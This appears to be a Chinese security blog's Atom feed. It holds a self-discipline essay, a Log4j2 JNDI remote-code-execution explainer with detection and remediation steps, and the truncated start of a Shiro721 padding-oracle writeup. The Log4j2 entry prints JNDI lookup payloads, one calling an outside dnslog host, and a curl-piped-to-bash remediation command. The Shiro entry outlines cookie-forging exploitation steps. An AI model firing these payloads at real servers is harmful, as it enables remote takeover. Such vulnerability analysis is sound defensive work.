<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://yinwc.github.io/atom.xml" rel="self"/>
  
  <link href="https://yinwc.github.io/"/>
  <updated>2023-04-07T07:14:06.063Z</updated>
  <id>https://yinwc.github.io/</id>
  
  <author>
    <name>Y1ZkRA</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>人生的灯塔</title>
    <link href="https://yinwc.github.io/2023/03/06/%E8%87%AA%E5%BE%8B/"/>
    <id>https://yinwc.github.io/2023/03/06/%E8%87%AA%E5%BE%8B/</id>
    <published>2023-03-06T09:52:25.000Z</published>
    <updated>2023-04-07T07:14:06.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="语句摘录"><a href="#语句摘录" class="headerlink" title="语句摘录"></a>语句摘录</h2><ul><li>每当你行至命运的三岔路口，踌躇不决的时候可能命运早就给你画好了以后的人生路。</li><li>严格的自律和时间管理，是人与人产生差距非常重要的原因，超过智商因素。</li><li>人的一生，注定会遇见很多人，有人可以陪你到最后，可有人只能教会你成长。</li></ul><h1 id="自律，决定一生！"><a href="#自律，决定一生！" class="headerlink" title="自律，决定一生！"></a>自律，决定一生！</h1><h2 id="胸中藏有大志的人，往往是一个很自律的人"><a href="#胸中藏有大志的人，往往是一个很自律的人" class="headerlink" title="胸中藏有大志的人，往往是一个很自律的人"></a>胸中藏有大志的人，往往是一个很自律的人</h2><ul><li>重庆谈判中，蒋介石曾对秘书陈布雷说：“毛泽东不可轻视。他嗜烟如命，但他知道我不吸烟后，在同我谈话期间，竟绝不抽一支。对他的决心和精神，不可小视!”</li><li>自律的人，既可怕，又可敬。如果是伙伴，你要跟他学会律己;如果是对手，你要做好足够的心理准备。 </li><li>以前总觉得，人生苦短，应及时行乐。今朝有酒今朝醉，人不风流枉少年。直到后来，我渐渐发现：每一个不自律的行为，都会给你带来更大的痛苦。不要做欲望的奴隶，自律可以令我们活得更高级。 </li><li>自由的本质不是放纵自己，不是无所不为，而是自律之后的舒畅，是有所为，有所不为!</li></ul><h2 id="人为什么要自律"><a href="#人为什么要自律" class="headerlink" title="人为什么要自律"></a>人为什么要自律</h2><ul><li>很多时候，我们只看到了别人优秀的样子，却往往忽略了他们为此付出了近乎自虐般的努力。 </li><li>一个自律到骨子里的人，看上去大多是无趣的。 <ul><li>在别人出去玩乐的时候，一个人窝在那里看书;在别人享用着美食的时候，在健身房里挥汗如雨;周末的时光，很多人慵懒地睡到中午，他依旧雷打不动的早起、跑步、看书、工作… 这样的人，不仅看起来无趣，甚至感觉有自虐倾向，活得一点都不洒脱和自由。但真实情况是，自律的人比不自律的人要自由得多。</li></ul></li><li>如果你总是随心所欲，讲究及时行乐，不知道努力，别人玩你也玩，别人努力你还在玩，依旧放纵自己。 </li><li>那么如此不自律的你，现在看似是自由的，但你会发现自己越活越没有自由，没有选择的资本。</li><li>康德说，所谓自由，不是随心所欲，而是自我主宰。 </li><li>越自律，越有话语权，身体和人生都是如此。 </li><li>一天两天看不出来，一个月两个月也许还是看不出来，但是一年两年，甚至十年二十年，自律的人和不自律的人，终将走上截然不同的道路。 </li><li>付出和回报是成正比的，量变足够了才可能促成质变。</li><li>这就是一个人为什么要自律的原因，和梦想沾不上边，就是简简单单地为自己以后能真正自由一点，身体和人生都自由一点。</li><li>越是自律的人越明白自己真正想要的是什么，所以才不会把时间和精力白白浪费在无意义的事情上，而是真的把碎片化时间都利用起来成长自己。</li></ul><h2 id="所有优秀，背后都有苦行僧般的自律"><a href="#所有优秀，背后都有苦行僧般的自律" class="headerlink" title="所有优秀，背后都有苦行僧般的自律"></a>所有优秀，背后都有苦行僧般的自律</h2><ul><li>说要自律的人很多，可坚持自律的人很少，就像爬一座险峻的高山，越临近山顶，能够咬牙坚持往前走的人越少。 </li><li>好的坚持，本身就是一种自律。 </li><li>还记得去年的时候，一位名叫沈华的96岁老爷爷走红网络，健身26年的他体格健壮，完全不像一个近百岁的老人，大家都喊他“华仔”、“华叔”。 </li><li>沈老每天的作息时间非常规律，从不超过晚上十点睡觉，早晨四点多就起床活动身体，每天下午到健身房报到。 </li><li>他的同龄人很多都已经不在了，沈老说：“现在健身和运动是我最好的朋友”。 </li><li>七十多岁的沈华最初进健身房，总遭遇很多白眼，很多人都觉得他一把年纪，肯定坚持不了多久，可现实是，很多年轻人只是健身房的过客，沈华却用二十年变成了为人熟知的“肌肉爷爷”。</li><li>日本作家村上春树从30岁开始写作，至今已快有40个年头，创作出了大量的作品，经典又高产。 </li><li>村上春树写作有个习惯，他每天只写4000字，400字一页的纸，每天写到10页就停下来。 </li><li>另外，他每天都会拿出一个小时出来跑步，雷打不动，正是这种高度自律，让他有精力能够持续产出优秀的作品出来。 </li><li>很多时候，不是优秀才自律，而是你自律了，才会变得优秀。而那些自律的人，往往连老天爷都不忍心辜负他们。</li></ul><h2 id="越自律，越优秀"><a href="#越自律，越优秀" class="headerlink" title="越自律，越优秀"></a>越自律，越优秀</h2><ul><li>《认知突围》中有句话说：所有的懒惰、放纵、自制力不足，根源都在于认知能力受限。 </li><li>越自律，认知能力越强，人和人的差距，就是这样逐渐拉开的。 </li><li>一个人的自律中，藏着无限的可能性，你自律的程度，决定着你人生的高度。 </li><li>每个人都有权利选择怎样活着，有人认为人生苦短，要及时行乐，没有问题，但我想告诉你，自律的人生其实更加美好，因为当你知道自己想要去哪儿并且全力以赴奔跑的时候，全世界都会为你让路。 </li><li>真正能够登顶远眺的人，永远是那些心无旁骛，坚持着往前走的人。 </li><li>愿我们真正成为自律的自己，活成自己喜欢的样子，过上自己想要的生活。 </li><li>人生没有近路可走，但你走的每一步，都算数。 </li><li>越勤奋，越努力;越自律，越优秀。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;语句摘录&quot;&gt;&lt;a href=&quot;#语句摘录&quot; class=&quot;headerlink&quot; title=&quot;语句摘录&quot;&gt;&lt;/a&gt;语句摘录&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;每当你行至命运的三岔路口，踌躇不决的时候可能命运早就给你画好了以后的人生路。&lt;/li&gt;
&lt;li&gt;严格的自律和时间</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Log4j2远程命令执行漏洞</title>
    <link href="https://yinwc.github.io/2021/12/12/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yinwc.github.io/2021/12/12/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-12-12T02:46:33.000Z</published>
    <updated>2023-02-07T09:05:52.757Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a><ul><li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a><ul><li><a href="#jndi">JNDI</a></li><li><a href="#ldap">LDAP</a></li><li><a href="#codebase">Codebase</a></li></ul></li><li><a href="#log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">Log4j2漏洞原理</a><ul><li><a href="#java%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8E%9F%E7%90%86%E7%BD%91%E4%B8%8A%E6%99%AE%E9%81%8D%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86">Java低版本原理（网上普遍攻击原理）</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%8E%9F%E7%90%86">攻击流程与原理</a></li></ul></li></ul></li><li><a href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95">测试方法</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">修复建议</a><ul><li><a href="#%E6%96%B9%E6%A1%88a%E4%B8%B4%E6%97%B6%E6%96%B9%E6%A1%88">方案A（临时方案）：</a></li><li><a href="#%E6%96%B9%E6%A1%88b%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D">方案B（官方修复）：</a></li></ul></li><li><a href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90">补丁分析</a><ul><li><a href="#rc1">rc1</a><ul><li><a href="#rc1-%E7%BB%95%E8%BF%87">rc1 绕过</a></li></ul></li><li><a href="#rc2">rc2</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol><li><p>Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。从Apache Log4j2 漏洞影响面查询的统计来看，影响多达60644个开源软件，涉及相关版本软件包更是达到了321094个。而本次漏洞的触发方式简单，利用成本极低，可以说是一场java生态的‘浩劫’。</p></li><li><p>java日志模块存在远程命令执行漏洞可直接控制目标服务器，<strong>攻击者利用难度极低</strong>,  <strong>Java 技术栈业务及使用java开源软件需要重点关注</strong>，由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，<strong>触发远程代码执行漏洞</strong>。</p></li><li><p>该漏洞可通过 critical、error、warining、notice、info、debug等日志级别触发，只需部分日志内容可控，<strong>大量开源组件被波及</strong>，包括 ELK、 Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。目前漏洞细节已被公开，攻击者可利用该漏洞进行远程命令执行（可导致服务器沦陷等）。</p></li><li><p>漏洞影响范围：</p><ul><li>Apache Log4j 1.x (1.x默认不支持jndi，若启用JMS的appender受影响，没有添加过Appenders组件相关配置或函数内未引用Appenders就没有影响)</li><li>Apache Log4j 远程命令执行漏洞 影响版本： <strong>Apache Log4j 2.x &lt; 2.15.0-rc2</strong></li><li>Apache Log4j 拒绝服务漏洞（CVE-2021-45105）影响版本：2.0-alpha1 至 2.16.0 (如果是JAVA7 可以通过升级到2.12.3解决此问题)</li><li>Apache dubbo的影响参考官方<a href="https://github.com/apache/dubbo/issues/9380">https://github.com/apache/dubbo/issues/9380</a></li></ul></li></ol><p><a href="https://www.cnblogs.com/xfeiyun/p/15999955.html">Log4j和Log4j2的区别</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><ul><li><p>总结：JNDI是Java提供的Java命名和目录接口。通过调用JNDI的API可以定位资源和其他程序对象。</p><ul><li>JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。</li></ul></li><li><p><code>JNDI</code>全称 Java Naming and Directory Interface（Java命名和目录接口）。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。JDNI是provider-based的技术(如同其它很多Java技术一样)，暴露了一个API和一个<strong>服务供应接口（SPI）</strong>。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。</p></li><li><p><code>JDNI通过绑定的概念将对象和名称联系起来</code>。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p></li></ul><p>参考文章：<a href="https://www.cnblogs.com/xdp-gacl/p/3951952.html">JNDI学习总结(一)——JNDI数据源的配置</a></p><h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><p><code>LDAP</code>全称 Light Directory Access Protocol（轻型目录访问协议），是基于X.500标准的轻量级目录访问协议。</p><ul><li><p>总结：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）</p></li><li><p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。</p><ul><li>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</li><li>目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。</li><li>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。</li></ul></li></ul><p>参考：<a href="https://www.cnblogs.com/wilburxu/p/9174353.html">LDAP概念和原理介绍</a></p><h4 id="Codebase"><a href="#Codebase" class="headerlink" title="Codebase"></a>Codebase</h4><p>Codebase就是存储代码或者编译文件的服务。其可以根据名称返回对应的代码或者编译文件，如果根据类名，提供类对应的Class文件。</p><h3 id="Log4j2漏洞原理"><a href="#Log4j2漏洞原理" class="headerlink" title="Log4j2漏洞原理"></a>Log4j2漏洞原理</h3><h4 id="Java低版本原理（网上普遍攻击原理）"><a href="#Java低版本原理（网上普遍攻击原理）" class="headerlink" title="Java低版本原理（网上普遍攻击原理）"></a>Java低版本原理（网上普遍攻击原理）</h4><p>原理概述：</p><ul><li><code>Log4j2</code>漏洞总的来说就是：因为<code>Log4j2</code>默认支持解析<code>ldap/rmi</code>协议（只要打印的日志中包括ldap&#x2F;rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap:&#x2F;&#x2F;localhost:9999&#x2F;Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</li></ul><h4 id="攻击流程与原理"><a href="#攻击流程与原理" class="headerlink" title="攻击流程与原理"></a>攻击流程与原理</h4><p><strong>总结：</strong></p><p>1、攻击则发送带有恶意<code>Ldap</code>内容的字符串，让服务通过<code>log4j2</code>打印<br>2、<code>log4j2</code>解析到<code>ldap</code>内容，会调用Java底层的<code>Lookup</code>方法，完成<code>Ldap</code>的<code>Lookup</code>操作。<br>3、<code>Java</code>底层请求<code>Ldap</code>服务器（恶意服务器），得到了<code>Codebase</code>地址，告诉客户端去该地址获取他需要的类。<br>4、<code>Java</code>请求<code>Codebase</code>服务器(恶意服务器)获取到对应的类（恶意类），并在本地加载和实例化（触发恶意代码）。</p><p><img src="/2021/12/12/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg" alt="Log4j2远程命令执行漏洞"></p><p><strong>具体攻击流程：</strong></p><ol><li>首先攻击者遭到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：<code>$&#123;jndi:ldap://localhost:9999/Test&#125;</code>。</li><li>被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。</li><li>此时<code>Log4j2</code>会解析<code>$&#123;&#125;</code>，读取出其中的内容。判断其为<code>Ldap</code>实现的<code>JNDI</code>。于是调用Java底层的<code>Lookup</code>方法，尝试完成<code>Ldap</code>的<code>Lookup</code>操作。</li><li>请求<code>Ldap</code>服务器，获取到<code>Ldap</code>协议数据。<code>Ldap</code>会返回一个<code>Codebase</code>告诉客户端，需要从该<code>Codebase</code>去获取其需要的Class数据。</li><li>请求<code>Ldap</code>中返回的<code>Codebase</code>路径，去<code>Codebase</code>下载对应的<code>Class</code>文件，并通过类加载器将其加载为Class类，然后调用其默认构造函数将该Class类实例化成一个对象。就会导致我们攻击代码中的静态块中的内容被执行。</li></ol><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>1、dnslog手动验证方法</p><ul><li>首先在dnslog平台获取一个子域名，尝试构造payload，插入请求数据包。<br><code>$&#123;jndi:ldap://bypass.fzuqgl.ceye.io&#125;</code></li><li>通过dnslog平台是否收到请求，初步判断目标环境是否存在漏洞。</li></ul><p>2、Log4j-scan等一些自动化工具</p><ul><li>Log4j-scan是一款用于查找log4j2漏洞的python脚本，支持url检测，支持HTTP请求头和POST数据参数进行模糊测试。</li><li>github项目地址：<a href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a></li></ul><p>3、Log4j2 burp被动扫描插件</p><ul><li>通过插件的方式，将log4j2漏洞检测能力集成到burp，从而提升安全测试人员的漏洞发现能力。</li><li>github项目地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/f0ng/log4j2burpscanner</span><br><span class="line">https://github.com/Jeromeyoung/log4j2burpscanner</span><br></pre></td></tr></table></figure></li></ul><p>4、AWVS扫描log4j2漏洞<br>AWVS14最新版本支持log4j2漏洞检测，支持批量扫描</p><p>5、制品级Log4j2漏洞检测工具<br>检测工具基于腾讯安全的binAuditor，支持 Jar&#x2F;Ear&#x2F;War包上传，一键上传即可获取到检测结果。<br>检测地址：<br><code>https://bsca.ms.qq.com/</code></p><p>6、Log4j2 本地检测工具<br>基于长亭牧云产品提取出来的Log4j2本地检测工具，可快速发现当前服务器存在风险的 log4j2 应用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://log4j2-detector.chaitin.cn/</span><br></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>为避免最新版本被再次绕过，在执行方案B的同时，也强烈建议执行方案A中的措施之一） ：</p><h3 id="方案A（临时方案）："><a href="#方案A（临时方案）：" class="headerlink" title="方案A（临时方案）："></a>方案A（临时方案）：</h3><ul><li><p>五选一必须执行：</p><ul><li>修改jvm参数:  -Dlog4j2.formatMsgNoLookups&#x3D;true <strong>（仅在Apache log4j 2.10.0&gt;&#x3D;版本中有效）</strong> </li><li>修改配置文件: 在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups&#x3D;true（<strong>仅在Apache log4j 2.10.0&gt;&#x3D;版本中有效</strong>）</li><li>代码层加固： System.setProperty(“log4j2.formatMsgNoLookups”, “true”);（<strong>仅在Apache log4j 2.10.0&gt;&#x3D;版本中有效</strong>）</li><li>移除log4j-core包中JndiLookup 类文件，并重启服务（需各部门及业务线评估条件是否允许，需验证移除后对稳定性的影响）<ul><li>具体命令：zip -q -d log4j-core-<em>.jar org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiLookup.class <strong># 如果业务上是打好包的jar包，需要解压后寻找 log4j-core-*.jar，操作完了之后，再打回 jar 包</strong></em></li><li>一键查询机器上所有log4j-core-*.jar 并删除 JndiLookup.class<ul><li><p>1、方法一：<br>1、自行找到log4j-core-*.jar所在目录，然后执行path命令<br>2、执行完了，记得重启服务，重启服务，重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd log4j-core-*.jar所在的目录</span><br><span class="line">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure></li><li><p>2、方法二：<br>1、执行一键处置脚本<br>2、脚本原理：查询机器上所有log4j-core-*.jar 文件，然后执行path命令删除 JndiLookup.class, 采用该方法前建议自行做下实际环境的测试，然后分布灰度执行<br><code>curl http://10.115.141.24:8000/DelJndiFromLog4jCoreJar.sh | bash </code></p></li><li><p>3、Logstash 处置方式<br><code>zip -q -d &lt;LOGSTASH_HOME&gt;/logstash-core/lib/jars/log4j-core-2.* org/apache/logging/log4j/core/lookup/JndiLookup.class</code><br>然后重启 logstash 即可</p></li><li><p>4、注意事项</p><ul><li>有的环境是将 log4j-core-<em>.jar 二次打包成 jar 包（多层jar打包），需要先解压外层jar包 ，让 log4j-core-</em>.jar 以单文件的形式存在于服务器上，然后执行方法一或者方法二的 path 命令</li><li>执行完后再重新打包，解包打包参考如下<ul><li>解包<ul><li><code>jar -xvf hello.jar</code></li></ul></li><li>打包<ul><li><code>jar -cvf0m hello.jar ./META-INF/MANIFEST.MF .</code></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>禁用JNDI服务（需各部门及业务线评估条件是否允许）</p><ul><li>对存在sprint boot的server关闭jndi服务（在不影响业务的情况下），操作方式：在项目的根目录中编辑（如果无就新建）spring.properties或application.properties配置文件，添加属性以及值spring.jndi.ignore&#x3D;true。</li></ul></li><li><p>二选一强烈建议执行：</p><ul><li>有公网权限的下掉公网权限，避免因为jndi出网被反弹shell控制机器权限，若有必要业务请采取出网白名单方式；</li><li>接入OpenRasp</li></ul></li></ul><h3 id="方案B（官方修复）："><a href="#方案B（官方修复）：" class="headerlink" title="方案B（官方修复）："></a>方案B（官方修复）：</h3><ul><li>更新为目前最新版本：<ul><li>官方地址：<a href="https://logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html#</a></li><li>Baidu Maven仓库（<strong>目前已经是2.16版本，以上方官方地址最新版为准</strong>）：<a href="http://maven.scm.baidu.com:8081/nexus/content/groups/public/org/apache/logging/log4j/log4j-core/2.16.0/">http://maven.scm.baidu.com:8081/nexus/content/groups/public/org/apache/logging/log4j/log4j-core/2.16.0/</a></li></ul></li></ul><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><h3 id="rc1"><a href="#rc1" class="headerlink" title="rc1"></a>rc1</h3><p>2.15.0-rc1</p><ul><li><p>总结：rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为java、ldap、ldaps，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。</p></li><li><p>具体分析：</p><ul><li><p>通过比较2.15.0-rc1和该版本之前最后一个版本2.14.1之间的差异，可以发现Log4j2团队在12月5日提交了一个名为Restrict LDAP access via JNDI (#608)的commit。该commit的详细内容如下链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3</span><br></pre></td></tr></table></figure></li><li><p>除去一些测试代码和辅助代码，该commit最主要内容是在3.5章节中提到的 JndiManager.lookup()方法增加了几种限制，分别是<code>allowedHosts</code>、<code>allowedClasses</code>、<code>allowedProtocols</code>。</p></li><li><p>各个限制的内容分别如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allowedHosts</span><br><span class="line"></span><br><span class="line">allowedClasses</span><br><span class="line"></span><br><span class="line">allowedProtocols</span><br></pre></td></tr></table></figure></li><li><p>可以看到，rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为java、ldap、ldaps，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。</p></li></ul></li></ul><h4 id="rc1-绕过"><a href="#rc1-绕过" class="headerlink" title="rc1 绕过"></a>rc1 绕过</h4><ul><li><p>发生原因：rc1默认不对URISyntaxException异常做任何处理，</p></li><li><p>绕过方法：通过构建一个简单的带空格的异形URI地址（127.0.0.1:8888&#x2F; 和exp之间）</p></li></ul><h3 id="rc2"><a href="#rc2" class="headerlink" title="rc2"></a>rc2</h3><p>2.15.0-rc2</p><ul><li>通过比较2.15.0-rc1和2.15.0-rc2之间的差异，可以发现Log4j2团队在12月10日提交了一个名为Handle URI exception的commit。该commit的详细内容如下链接：</li></ul><p><a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p><p>该commit主要内容是对rc1中JndiManager.lookup()方法里的catch代码块进行了修改：</p><ul><li>当URISyntaxException异常被捕获时，直接返回null。从而无法使用上一章节的异形URI地址绕过。</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121920264">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析</a></p><p><a href="https://www.anquanke.com/post/id/264176#h3-16">Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考</a></p><p><a href="https://droidkali.github.io/2021/12/30/Log4j2-RCE.html">Log4j2 RCE漏洞复现</a></p><p><a href="https://www.jianshu.com/p/35316d9a3b87">Log4j2漏洞复现（小白向教程）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3&quot;&gt;漏洞危害&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Shiro721（Apache Shiro RememberMe Padding Oracle 漏洞）</title>
    <link href="https://yinwc.github.io/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yinwc.github.io/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-06-16T10:00:54.000Z</published>
    <updated>2023-02-02T05:56:28.482Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4">漏洞复现步骤</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86">密码学知识</a><ul><li><a href="#aes%E7%AE%97%E6%B3%95">AES算法</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6%E4%BD%93%E5%88%B6%E4%BB%8B%E7%BB%8D">密码学体制介绍</a></li><li><a href="#cbc%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F">CBC加密模式</a></li><li><a href="#padding-%E5%A1%AB%E5%85%85%E6%9C%BA%E5%88%B6">Padding 填充机制</a></li><li><a href="#padding-oracle-attack-%E5%A1%AB%E5%85%85-oracle-%E6%94%BB%E5%87%BB">Padding Oracle Attack 填充 Oracle 攻击</a></li><li><a href="#cbc-byte-flipping-attack-cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB">CBC Byte-Flipping Attack CBC字节翻转攻击</a></li></ul></li></ul></li><li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro RememberMe Cookie默认通过<code>AES-128-CBC</code>模式加密，这种加密方式容易受到<code>Padding Oracle Attack（Oracle填充攻击）</code>，利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击.</p><ul><li>AES 是指 “高级加密标准”，是一种对称加密的分组加密算法，128是指密钥长度,CBC是指 “密码分组链接” 加密模式 , PKCS5Padding 是 Apache Shiro 中默认填充方式 , 最后一个明文分组缺少 N 个字节,则填充N个0x0N。</li><li>在 Apache Shiro 中默认使用 CBC 加密模式与 PKCS5Padding 填充方式，CBC 加密模式容易遭到 Padding Oracle Attack，攻击者可以通过枚举 IV 的方式计算出全部明文，并且可以通过 CBC Byte-Flipping Attack 篡改某一段的明文。</li><li>Padding Oracle Attack 利用前提 :<br>1、攻击者能够获得密文( CipherText )与附带在密文前面的初始化向量( IV )<br>2、服务端对密文解密后会判断 Padding 是否有效 . 并根据不同的判定结果返回不同的响应信息。</li><li>CBC Byte-Flipping Attack 利用前提 :<br>1、明文和密文已知</li></ul><h3 id="漏洞复现步骤"><a href="#漏洞复现步骤" class="headerlink" title="漏洞复现步骤"></a>漏洞复现步骤</h3><p>1、登录网站并且获取 RememberMe Cookie 值<br>2、使用 RememberMe Cookie 值来作为 Padding Oracle Attack 的前缀<br>3、通过 Padding Oracle Attack 的攻击方式精心构造可利用的 <code>YSoSerial</code> 反序列化数据<br>4、将构造好的反序列化数据填充到 RememberMe Cookie 字段中并发送 , 即可在目标服务器上执行任意代码.</p><h3 id="密码学知识"><a href="#密码学知识" class="headerlink" title="密码学知识"></a>密码学知识</h3><h4 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h4><p><code>Apache Shiro</code> 